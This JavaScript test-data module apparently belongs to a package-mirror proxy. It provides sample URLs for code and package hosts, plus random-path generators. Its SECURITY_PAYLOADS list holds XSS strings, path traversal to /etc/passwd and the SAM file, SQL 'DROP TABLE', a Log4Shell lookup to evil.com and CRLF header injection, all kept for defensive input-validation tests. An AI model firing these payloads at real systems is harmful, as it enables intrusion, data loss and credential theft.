/**
 * Test data generators
 */

/**
 * Generate test URLs for different platforms
 * @param {string} platform - Platform identifier (gh, gl, hf, etc.)
 * @param {string} path - Resource path
 * @returns {string} Complete test URL
 */
export function generateTestUrl(platform, path) {
  const baseUrl = 'https://example.com';
  return `${baseUrl}/${platform}/${path}`;
}

/**
 * Common test URLs for different platforms
 */
export const TEST_URLS = {
  github: {
    file: 'https://example.com/gh/microsoft/vscode/blob/main/package.json',
    raw: 'https://example.com/gh/microsoft/vscode/raw/main/README.md',
    release: 'https://example.com/gh/microsoft/vscode/archive/refs/heads/main.zip',
    archive: 'https://example.com/gh/microsoft/vscode/archive/refs/heads/main.zip',
    git: 'https://example.com/gh/microsoft/vscode.git'
  },
  gitlab: {
    file: 'https://example.com/gl/gitlab-org/gitlab/-/blob/master/package.json',
    raw: 'https://example.com/gl/gitlab-org/gitlab/-/raw/master/README.md',
    archive: 'https://example.com/gl/gitlab-org/gitlab/-/archive/master/gitlab-master.zip',
    git: 'https://example.com/gl/gitlab-org/gitlab.git'
  },
  huggingface: {
    model: 'https://example.com/hf/microsoft/DialoGPT-medium/resolve/main/config.json',
    dataset: 'https://example.com/hf/datasets/squad/resolve/main/train.json',
    file: 'https://example.com/hf/microsoft/DialoGPT-medium/resolve/main/pytorch_model.bin'
  },
  npm: {
    package: 'https://example.com/npm/react',
    tarball: 'https://example.com/npm/react/-/react-18.2.0.tgz',
    scoped: 'https://example.com/npm/@types/node',
    npmPackage: 'https://example.com/npm/npm',
    npmTarball: 'https://example.com/npm/npm/-/npm-11.5.1.tgz'
  },
  pypi: {
    simple: 'https://example.com/pypi/simple/requests/',
    package: 'https://example.com/pypi/packages/source/r/requests/requests-2.31.0.tar.gz',
    wheel: 'https://example.com/pypi/packages/py3/r/requests/requests-2.31.0-py3-none-any.whl'
  },
  conda: {
    main: 'https://example.com/conda/pkgs/main/linux-64/numpy-1.24.3.conda',
    community: 'https://example.com/conda/community/conda-forge/linux-64/repodata.json',
    repodata: 'https://example.com/conda/pkgs/main/linux-64/repodata.json'
  }
};

/**
 * Security test payloads
 */
export const SECURITY_PAYLOADS = {
  xss: [
    '<script>alert(1)</script>',
    'javascript:alert(1)',
    '"><script>alert(1)</script>',
    "';alert(1);//"
  ],
  pathTraversal: [
    '../../../etc/passwd',
    '..%2F..%2F..%2Fetc%2Fpasswd',
    '..\\..\\..\\windows\\system32\\config\\sam',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
  ],
  injection: ["'; DROP TABLE users; --", '${jndi:ldap://evil.com}', '{{7*7}}', '<%=7*7%>'],
  headerInjection: [
    'value\r\nX-Injected: malicious',
    'value\nX-Injected: malicious',
    'value\r\n\r\n<script>alert(1)</script>'
  ]
};

/**
 * Test data generators
 */
export const TestDataGenerator = {
  /**
   * Generate random string
   * @param {number} length - String length
   * @returns {string} Random string
   */
  randomString(length = 10) {
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  },

  /**
   * Generate random GitHub repository path
   * @returns {string} Repository path
   */
  githubRepo() {
    const users = ['microsoft', 'google', 'facebook', 'apple', 'amazon'];
    const repos = ['vscode', 'react', 'angular', 'vue', 'node'];
    const user = users[Math.floor(Math.random() * users.length)];
    const repo = repos[Math.floor(Math.random() * repos.length)];
    return `${user}/${repo}`;
  },

  /**
   * Generate random file path
   * @returns {string} File path
   */
  filePath() {
    const dirs = ['src', 'lib', 'test', 'docs', 'config'];
    const files = ['index.js', 'main.py', 'README.md', 'package.json', 'config.yml'];
    const dir = dirs[Math.floor(Math.random() * dirs.length)];
    const file = files[Math.floor(Math.random() * files.length)];
    return `${dir}/${file}`;
  }
};
